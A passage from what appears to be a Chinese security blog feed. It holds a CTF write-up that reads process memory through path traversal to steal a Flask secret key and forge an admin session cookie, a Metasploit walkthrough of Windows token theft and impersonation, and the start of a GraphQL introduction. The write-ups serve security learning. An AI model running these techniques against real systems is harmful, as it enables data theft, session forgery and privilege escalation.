00018000 fd:00 23480903 /usr/local/lib/python3.7/lib-dynload/_sha3.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083dd000-7f82083df000 r--p 00000000 fd:00 23480868 /usr/local/lib/python3.7/lib-dynload/_blake2.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083df000-7f82083e6000 r-xp 00002000 fd:00 23480868 /usr/local/lib/python3.7/lib-dynload/_blake2.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083e6000-7f82083e8000 r--p 00009000 fd:00 23480868 /usr/local/lib/python3.7/lib-dynload/_blake2.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083e8000-7f82083e9000 r--p 0000a000 fd:00 23480868 /usr/local/lib/python3.7/lib-dynload/_blake2.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083e9000-7f82083ea000 rw-p 0000b000 fd:00 23480868 /usr/local/lib/python3.7/lib-dynload/_blake2.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083ea000-7f820845f000 r--p 00000000 fd:00 23348863 /lib/libcrypto.so.1.1</span><br><span class="line">7f820845f000-7f82085b6000 r-xp 00075000 fd:00 23348863 /lib/libcrypto.so.1.1</span><br><span class="line">7f82085b6000-7f820863a000 r--p 001cc000 fd:00 23348863 /lib/libcrypto.so.1.1</span><br><span class="line">7f820863a000-7f8208665000 r--p 0024f000 fd:00 23348863 /lib/libcrypto.so.1.1</span><br><span class="line">7f8208665000-7f8208667000 rw-p 0027a000 fd:00 23348863 /lib/libcrypto.so.1.1</span><br><span class="line">7f8208667000-7f820866b000 rw-p 00000000 00:00 0 </span><br><span class="line">7f820866b000-7f820866d000 r--p 00000000 fd:00 23480888 /usr/local/lib/python3.7/lib-dynload/_hashlib.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820866d000-7f8208671000 r-xp 00002000 fd:00 23480888 /usr/local/lib/python3.7/lib-dynload/_hashlib.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208671000-7f8208673000 r--p 00006000 fd:00 23480888 /usr/local/lib/python3.7/lib-dynload/_hashlib.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208673000-7f8208674000 r--p 00007000 fd:00 23480888 /usr/local/lib/python3.7/lib-dynload/_hashlib.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208674000-7f8208675000 rw-p 00008000 fd:00 23480888 /usr/local/lib/python3.7/lib-dynload/_hashlib.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208675000-7f8208678000 r--p 00000000 fd:00 23480922 /usr/local/lib/python3.7/lib-dynload/math.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208678000-7f8208680000 r-xp 00003000 fd:00 23480922 /usr/local/lib/python3.7/lib-dynload/math.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208680000-7f8208682000 r--p 0000b000 fd:00 23480922 /usr/local/lib/python3.7/lib-dynload/math.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208682000-7f8208683000 r--p 0000c000 fd:00 23480922 /usr/local/lib/python3.7/lib-dynload/math.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208683000-7f8208685000 rw-p 0000d000 fd:00 23480922 /usr/local/lib/python3.7/lib-dynload/math.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208685000-7f8208688000 r--p 00000000 fd:00 23480205 /usr/lib/liblzma.so.5.2.5</span><br><span class="line">7f8208688000-7f820869b000 r-xp 00003000 fd:00 23480205 /usr/lib/liblzma.so.5.2.5</span><br><span class="line">7f820869b000-7f82086a6000 r--p 00016000 fd:00 23480205 /usr/lib/liblzma.so.5.2.5</span><br><span class="line">7f82086a6000-7f82086a7000 r--p 00020000 fd:00 23480205 /usr/lib/liblzma.so.5.2.5</span><br><span class="line">7f82086a7000-7f82086a8000 rw-p 00021000 fd:00 23480205 /usr/lib/liblzma.so.5.2.5</span><br><span class="line">7f82086a8000-7f82086aa000 r--p 00000000 fd:00 23480171 /usr/lib/libbz2.so.1.0.8</span><br><span class="line">7f82086aa000-7f82086b3000 r-xp 00002000 fd:00 23480171 /usr/lib/libbz2.so.1.0.8</span><br><span class="line">7f82086b3000-7f82086b5000 r--p 0000b000 fd:00 23480171 /usr/lib/libbz2.so.1.0.8</span><br><span class="line">7f82086b5000-7f82086b6000 r--p 0000c000 fd:00 23480171 /usr/lib/libbz2.so.1.0.8</span><br><span class="line">7f82086b6000-7f82086b7000 rw-p 0000d000 fd:00 23480171 /usr/lib/libbz2.so.1.0.8</span><br><span class="line">7f82086b7000-7f82086f7000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82086f8000-7f820871a000 rw-p 00000000 00:00 0 </span><br><span class="line">7f820871b000-7f8208721000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8208721000-7f820872a000 r--p 00000000 fd:00 23480907 /usr/local/lib/python3.7/lib-dynload/_ssl.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820872a000-7f8208733000 r-xp 00009000 fd:00 23480907 /usr/local/lib/python3.7/lib-dynload/_ssl.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208733000-7f820873a000 r--p 00012000 fd:00 23480907 /usr/local/lib/python3.7/lib-dynload/_ssl.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820873a000-7f820873b000 r--p 00018000 fd:00 23480907 /usr/local/lib/python3.7/lib-dynload/_ssl.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820873b000-7f8208740000 rw-p 00019000 fd:00 23480907 /usr/local/lib/python3.7/lib-dynload/_ssl.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208740000-7f8208744000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8208744000-7f8208745000 r--p 00000000 fd:00 23480921 /usr/local/lib/python3.7/lib-dynload/grp.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208745000-7f8208746000 r-xp 00001000 fd:00 23480921 /usr/local/lib/python3.7/lib-dynload/grp.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208746000-7f8208747000 r--p 00002000 fd:00 23480921 /usr/local/lib/python3.7/lib-dynload/grp.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208747000-7f8208748000 r--p 00002000 fd:00 23480921 /usr/local/lib/python3.7/lib-dynload/grp.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208748000-7f8208749000 rw-p 00003000 fd:00 23480921 /usr/local/lib/python3.7/lib-dynload/grp.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208749000-7f8208796000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8208796000-7f8208799000 r--p 00000000 fd:00 23348866 /lib/libz.so.1.2.11</span><br><span class="line">7f8208799000-7f82087a7000 r-xp 00003000 fd:00 23348866 /lib/libz.so.1.2.11</span><br><span class="line">7f82087a7000-7f82087ae000 r--p 00011000 fd:00 23348866 /lib/libz.so.1.2.11</span><br><span class="line">7f82087ae000-7f82087af000 r--p 00017000 fd:00 23348866 /lib/libz.so.1.2.11</span><br><span class="line">7f82087af000-7f82087b0000 rw-p 00018000 fd:00 23348866 /lib/libz.so.1.2.11</span><br><span class="line">7f82087b0000-7f82087b2000 r--p 00000000 fd:00 23480936 /usr/local/lib/python3.7/lib-dynload/zlib.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087b2000-7f82087b5000 r-xp 00002000 fd:00 23480936 /usr/local/lib/python3.7/lib-dynload/zlib.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087b5000-7f82087b7000 r--p 00005000 fd:00 23480936 /usr/local/lib/python3.7/lib-dynload/zlib.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087b7000-7f82087b8000 r--p 00006000 fd:00 23480936 /usr/local/lib/python3.7/lib-dynload/zlib.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087b8000-7f82087ba000 rw-p 00007000 fd:00 23480936 /usr/local/lib/python3.7/lib-dynload/zlib.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087ba000-7f82087be000 r--p 00000000 fd:00 23480897 /usr/local/lib/python3.7/lib-dynload/_pickle.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087be000-7f82087d3000 r-xp 00004000 fd:00 23480897 /usr/local/lib/python3.7/lib-dynload/_pickle.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087d3000-7f82087d8000 r--p 00019000 fd:00 23480897 /usr/local/lib/python3.7/lib-dynload/_pickle.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087d8000-7f82087d9000 r--p 0001d000 fd:00 23480897 /usr/local/lib/python3.7/lib-dynload/_pickle.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087d9000-7f82087dc000 rw-p 0001e000 fd:00 23480897 /usr/local/lib/python3.7/lib-dynload/_pickle.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087dc000-7f82087e4000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82087e4000-7f82087e7000 r--p 00000000 fd:00 23480908 /usr/local/lib/python3.7/lib-dynload/_struct.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087e7000-7f82087ed000 r-xp 00003000 fd:00 23480908 /usr/local/lib/python3.7/lib-dynload/_struct.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087ed000-7f82087f0000 r--p 00009000 fd:00 23480908 /usr/local/lib/python3.7/lib-dynload/_struct.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087f0000-7f82087f1000 r--p 0000b000 fd:00 23480908 /usr/local/lib/python3.7/lib-dynload/_struct.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087f1000-7f82087f3000 rw-p 0000c000 fd:00 23480908 /usr/local/lib/python3.7/lib-dynload/_struct.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82087f3000-7f820884e000 rw-p 00000000 00:00 0 </span><br><span class="line">7f820884e000-7f8208850000 r--p 00000000 fd:00 23480890 /usr/local/lib/python3.7/lib-dynload/_json.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208850000-7f8208857000 r-xp 00002000 fd:00 23480890 /usr/local/lib/python3.7/lib-dynload/_json.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208857000-7f8208859000 r--p 00009000 fd:00 23480890 /usr/local/lib/python3.7/lib-dynload/_json.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208859000-7f820885a000 r--p 0000a000 fd:00 23480890 /usr/local/lib/python3.7/lib-dynload/_json.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820885a000-7f820885b000 rw-p 0000b000 fd:00 23480890 /usr/local/lib/python3.7/lib-dynload/_json.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820885b000-7f8208866000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8208866000-7f8208867000 r--p 00000000 fd:00 44325187 /usr/local/lib/python3.7/site-packages/markupsafe/_speedups.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208867000-7f8208868000 r-xp 00001000 fd:00 44325187 /usr/local/lib/python3.7/site-packages/markupsafe/_speedups.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208868000-7f8208869000 r--p 00002000 fd:00 44325187 /usr/local/lib/python3.7/site-packages/markupsafe/_speedups.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208869000-7f820886a000 r--p 00002000 fd:00 44325187 /usr/local/lib/python3.7/site-packages/markupsafe/_speedups.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820886a000-7f820886b000 rw-p 00003000 fd:00 44325187 /usr/local/lib/python3.7/site-packages/markupsafe/_speedups.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820886b000-7f82089ca000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82089ca000-7f82089cb000 r--p 00000000 fd:00 23480889 /usr/local/lib/python3.7/lib-dynload/_heapq.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82089cb000-7f82089cc000 r-xp 00001000 fd:00 23480889 /usr/local/lib/python3.7/lib-dynload/_heapq.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82089cc000-7f82089cd000 r--p 00002000 fd:00 23480889 /usr/local/lib/python3.7/lib-dynload/_heapq.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82089cd000-7f82089ce000 r--p 00002000 fd:00 23480889 /usr/local/lib/python3.7/lib-dynload/_heapq.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82089ce000-7f82089d0000 rw-p 00003000 fd:00 23480889 /usr/local/lib/python3.7/lib-dynload/_heapq.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82089d0000-7f82089d3000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82089d3000-7f82089d5000 r--p 00000000 fd:00 23480065 /lib/libuuid.so.1.3.0</span><br><span class="line">7f82089d5000-7f82089d9000 r-xp 00002000 fd:00 23480065 /lib/libuuid.so.1.3.0</span><br><span class="line">7f82089d9000-7f82089da000 r--p 00006000 fd:00 23480065 /lib/libuuid.so.1.3.0</span><br><span class="line">7f82089da000-7f82089db000 r--p 00006000 fd:00 23480065 /lib/libuuid.so.1.3.0</span><br><span class="line">7f82089db000-7f82089dc000 rw-p 00007000 fd:00 23480065 /lib/libuuid.so.1.3.0</span><br><span class="line">7f82089dc000-7f82089dd000 r--p 00000000 fd:00 23480914 /usr/local/lib/python3.7/lib-dynload/_uuid.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82089dd000-7f82089de000 r-xp 00001000 fd:00 23480914 /usr/local/lib/python3.7/lib-dynload/_uuid.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82089de000-7f82089df000 r--p 00002000 fd:00 23480914 /usr/local/lib/python3.7/lib-dynload/_uuid.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82089df000-7f82089e0000 r--p 00002000 fd:00 23480914 /usr/local/lib/python3.7/lib-dynload/_uuid.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82089e0000-7f82089e1000 rw-p 00003000 fd:00 23480914 /usr/local/lib/python3.7/lib-dynload/_uuid.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82089e1000-7f8208a7b000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8208a7b000-7f8208a7d000 r--p 00000000 fd:00 23480892 /usr/local/lib/python3.7/lib-dynload/_lzma.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208a7d000-7f8208a80000 r-xp 00002000 fd:00 23480892 /usr/local/lib/python3.7/lib-dynload/_lzma.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208a80000-7f8208a82000 r--p 00005000 fd:00 23480892 /usr/local/lib/python3.7/lib-dynload/_lzma.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208a82000-7f8208a83000 r--p 00006000 fd:00 23480892 /usr/local/lib/python3.7/lib-dynload/_lzma.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208a83000-7f8208a85000 rw-p 00007000 fd:00 23480892 /usr/local/lib/python3.7/lib-dynload/_lzma.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208a85000-7f8208a87000 r--p 00000000 fd:00 23480869 /usr/local/lib/python3.7/lib-dynload/_bz2.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208a87000-7f8208a89000 r-xp 00002000 fd:00 23480869 /usr/local/lib/python3.7/lib-dynload/_bz2.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208a89000-7f8208a8a000 r--p 00004000 fd:00 23480869 /usr/local/lib/python3.7/lib-dynload/_bz2.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208a8a000-7f8208a8b000 r--p 00004000 fd:00 23480869 /usr/local/lib/python3.7/lib-dynload/_bz2.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208a8b000-7f8208a8c000 rw-p 00005000 fd:00 23480869 /usr/local/lib/python3.7/lib-dynload/_bz2.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208a8c000-7f8208c6e000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8208c6e000-7f8208ccd000 r--p 00000000 fd:00 23480353 /usr/local/lib/libpython3.7m.so.1.0</span><br><span class="line">7f8208ccd000-7f8208e68000 r-xp 0005f000 fd:00 23480353 /usr/local/lib/libpython3.7m.so.1.0</span><br><span class="line">7f8208e68000-7f8208f14000 r--p 001fa000 fd:00 23480353 /usr/local/lib/libpython3.7m.so.1.0</span><br><span class="line">7f8208f14000-7f8208f1a000 r--p 002a5000 fd:00 23480353 /usr/local/lib/libpython3.7m.so.1.0</span><br><span class="line">7f8208f1a000-7f8208f82000 rw-p 002ab000 fd:00 23480353 /usr/local/lib/libpython3.7m.so.1.0</span><br><span class="line">7f8208f82000-7f8208fa3000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8208fa3000-7f8208fb8000 r--p 00000000 fd:00 23348860 /lib/ld-musl-x86_64.so.1</span><br><span class="line">7f8208fb8000-7f8209000000 r-xp 00015000 fd:00 23348860 /lib/ld-musl-x86_64.so.1</span><br><span class="line">7f8209000000-7f8209036000 r--p 0005d000 fd:00 23348860 /lib/ld-musl-x86_64.so.1</span><br><span class="line">7f8209036000-7f8209037000 r--p 00092000 fd:00 23348860 /lib/ld-musl-x86_64.so.1</span><br><span class="line">7f8209037000-7f8209038000 rw-p 00093000 fd:00 23348860 /lib/ld-musl-x86_64.so.1</span><br><span class="line">7f8209038000-7f820903b000 rw-p 00000000 00:00 0 </span><br><span class="line">7fff969ea000-7fff96a0b000 rw-p 00000000 00:00 0 [stack]</span><br><span class="line">7fff96a87000-7fff96a8a000 r--p 00000000 00:00 0 [vvar]</span><br><span class="line">7fff96a8a000-7fff96a8c000 r-xp 00000000 00:00 0 [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]</span><br></pre></td></tr></table></figure>

<p>从中寻找开始地址和结束地址并带入&#x2F;proc&#x2F;self&#x2F;men中去查找secret_key，代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re,requests</span><br><span class="line">line=<span class="built_in">open</span>(file=<span class="string">&quot;maps.text&quot;</span>,mode=<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">file_date=line.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> lines <span class="keyword">in</span> file_date:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;rw&#x27;</span> <span class="keyword">in</span> lines:</span><br><span class="line">        addr = re.search(<span class="string">&#x27;([0-9a-f]+)-([0-9a-f]+)&#x27;</span>, lines)</span><br><span class="line">        start = <span class="built_in">int</span>(addr.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">        end = <span class="built_in">int</span>(addr.group(<span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">        <span class="built_in">print</span>(start, end)</span><br><span class="line">        url = <span class="string">f&quot;http://61.147.171.105:59773/info?file=../../../../proc/self/mem&amp;start=<span class="subst">&#123;start&#125;</span>&amp;end=<span class="subst">&#123;end&#125;</span>&quot;</span></span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        secret_key = re.findall(<span class="string">&quot;[a-z0-9]&#123;32&#125;\*abcdefgh&quot;</span>, response.text)</span><br><span class="line">        <span class="keyword">if</span> secret_key:</span><br><span class="line">            <span class="built_in">print</span>(secret_key)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>得到secret_key</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cff65a3817204001ad76ae1e8cb13484*abcdefgh</span><br></pre></td></tr></table></figure>



<p>接下来伪造flask_session，首先使用工具对cookie值中保存的session进行解密</p>
<p>首先获取请求cookie值eyJhZG1pbiI6MH0.ZYgsLg.pV_q1l7XRYFtpUxbQIMozaQ6H5c</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py  decode -s &quot;cff65a3817204001ad76ae1e8cb13484*abcdefgh&quot; -c &quot;eyJhZG1pbiI6MH0.ZYgsLg.pV_q1l7XRYFtpUxbQIMozaQ6H5c&quot;</span><br></pre></td></tr></table></figure>

<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Web%E7%B3%BB%E5%88%97%E4%B9%8Bcatcat-new/image-20231224220820115.png" class title="image-20231224220820115">

<p>解密后得到{‘admin’:0}</p>
<p>这里需要将admin的值修改为1，所以需要对其进行加密生成cookie，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py  encode -s &quot;cff65a3817204001ad76ae1e8cb13484*abcdefgh&quot; -t &quot;&#123;&#x27;admin&#x27;:1&#125;&quot;</span><br></pre></td></tr></table></figure>

<p>得到session值为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhZG1pbiI6MX0.ZYg81w.EwaiU-aGRzeNiuCeME1rBic-cVI</span><br></pre></td></tr></table></figure>



<p>将请求报文中的cookie修改为以上值请求获取flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">catctf&#123;Catch_the_c4t_HaHa&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>-CTF -Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows令牌假冒</title>
    <url>/2022/05/15/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/</url>
    <content><![CDATA[<h1 id="windows令牌假冒"><a href="#windows令牌假冒" class="headerlink" title="windows令牌假冒"></a>windows令牌假冒</h1><hr>
<h2 id="访问令牌"><a href="#访问令牌" class="headerlink" title="访问令牌"></a>访问令牌</h2><hr>
<p><strong>访问令牌</strong>（Access Token）是Windows操作系统用于描述进程或线程安全上下文的一种对象。不同的用户登录计算机后， 都会生成一个Access Token，这个Token在用户创建进程或者线程时会被使用，不断的拷贝。</p>
<p>系统使用访问令牌来辨识拥有进程的用户，以及线程试图执行系统任务时是否具有所需的特权.与进程相关联，进程创建时根据LoginSession分配对应的TOKEN，含有与该进程用户账号、组信息、权限信息等。Token每次在用户登录时根据LoginSession分配，访问资源时提交Token进行身份验证。</p>
<p><strong>令牌分类</strong></p>
<ul>
<li>访问令牌(Access Token): 表示访问控制操作主体的系统对象</li>
<li>会话令牌(Session Token): 交互会话中唯一的身份标识符</li>
<li>密保令牌(Security Token): 又叫做认证令牌或硬件令牌，是一种计算机身份校验的物理设备，例如U盾</li>
</ul>
<p>windows系统下的令牌有两种表现形式:</p>
<p>1.Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)<br>2.Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)</p>
<p>两种令牌都是在重启后才会消除，具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效。</p>
<h2 id="令牌窃取-x2F-假冒"><a href="#令牌窃取-x2F-假冒" class="headerlink" title="令牌窃取&#x2F;假冒"></a>令牌窃取&#x2F;假冒</h2><hr>
<p>这里使用msf的模块对系统中从令牌进行窃取，并对获取到的令牌进行利用</p>
<h3 id="incognito模块"><a href="#incognito模块" class="headerlink" title="incognito模块"></a>incognito模块</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load incognito 加载模块</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/image-20211021210024276.png" class title="image-20211021210024276">

<p>相关参数命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">list_tokens               列举token，-u参数列举用户，-g参数列举用户组</span><br><span class="line">impersonate_token [token] 令牌假冒登录用户</span><br></pre></td></tr></table></figure>



<p>列举所有用户令牌</p>
<img src="/2022/05/15/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/image-20211021210254864.png" class title="image-20211021210254864">



<p>列举所有用户组令牌</p>
<img src="/2022/05/15/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/image-20211021210343650.png" class title="image-20211021210343650">



<p>此时的权限为SYSTEM权限</p>
<img src="/2022/05/15/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/image-20211021211343377.png" class title="image-20211021211343377">



<p>假冒NETWORK SERVICE的令牌，这里的\有两个，前面的符号是转义符号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impressonate_token ndsec-PC\\ndsec</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/image-20211021211257111.png" class title="image-20211021211257111">



<p>令牌已经被修改</p>
<img src="/2022/05/15/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/image-20211021211407856.png" class title="image-20211021211407856">



<h3 id="steal-token盗取进程令牌"><a href="#steal-token盗取进程令牌" class="headerlink" title="steal_token盗取进程令牌"></a>steal_token盗取进程令牌</h3><hr>
<p>使用steal_token命令盗用进程的令牌</p>
<p>列出当前状态下服务器的运行的进程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/image-20211021212304540.png" class title="image-20211021212304540">



<p>可以看到我们此时的会话进程号是1288，令牌是SYSTEM</p>
<img src="/2022/05/15/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/image-20211021212412558.png" class title="image-20211021212412558">



<p>盗取dwm.exe进程的令牌ndsec-PC\ndsec</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">steal_token 2884</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内网渗透</category>
        <category>横向渗透</category>
      </categories>
      <tags>
        <tag>-内网渗透 -Winows系统提权 -msf渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>GraphQL之内省</title>
    <url>/2022/03/15/%E4%BA%86%E8%A7%A3GraphQL/</url>
    <content><![CDATA[<h1 id="GraphQL之内省"><a href="#GraphQL之内省" class="headerlink" title="GraphQL之内省"></a>GraphQL之内省</h1><p>GraphQL 是一种用于<a href="https://www.redhat.com/zh/topics/api/what-are-application-programming-interfaces">应用编程接口（API）</a>的查询语言。在服务器端运行时，它可以使客户端准确地获得所需的数据，没有任何冗余。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>GraphQL 旨在让 API 变得快速、灵活并且为开发人员提供便利。GraphQL 允许开发人员构建相应的请求，从而通过单个 API 调用从多个数据源中提取数据。此外，GraphQL 还可让 API 维护人员灵活地添加或弃用字段，而不会影响现有查询。开发人员可以使用自己喜欢的方法来构建 API，并且 GraphQL 规范将确保它们以可预测的方式在客户端发挥作用。</p>
<h2 id="查询语法"><a href="#查询语法" class="headerlink" title="查询语法"></a>查询语法</h2><p>GraphQL 模式由对象类型组成，它表示可以请求哪种对象以及它有哪些字段。当用户<strong>查询</strong>时，GraphQL 会根据模式对查询进行验证。随后，GraphQL 将执行经过验证的查询。API 开发人员将模式中的每个字段附加到名为<strong>解析器</strong>的函数中。执行期间，系统将调用解析器来生成相应的值。</p>
<p>例如，一个 GraphQL 服务告诉我们当前登录用户是 <code>me</code>，这个用户的名称可能像这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type Query &#123;</span><br><span class="line">  me: User</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">type User &#123;</span><br><span class="line">  id: ID</span><br><span class="line">  name: String</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一并的还有每个类型上字段的解析函数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Query_me</span>(<span class="params">request</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> request.auth.user;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">User_name</span>(<span class="params">user</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> user.getName();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一旦一个 GraphQL 服务运行起来（通常在 web 服务的一个 URL 上），它就能接收 GraphQL 查询，并验证和执行。接收到的查询首先会被检查确保它只引用了已定义的类型和字段，然后运行指定的解析函数来生成结果。</p>
<p>例如这个查询：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  me &#123;</span><br><span class="line">    name</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会产生这样的JSON结果：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;me&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Luke Skywalker&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="查询示例"><a href="#查询示例" class="headerlink" title="查询示例"></a>查询示例</h2><p>我们来看看来自 GraphQL 项目网站 <a href="http://graphql.org/">graphql.org</a> 的 3 个示例。</p>
<p>第一个示例为客户端构造GraphQL查询，要求API以指定的形态返回特定字段。</p>
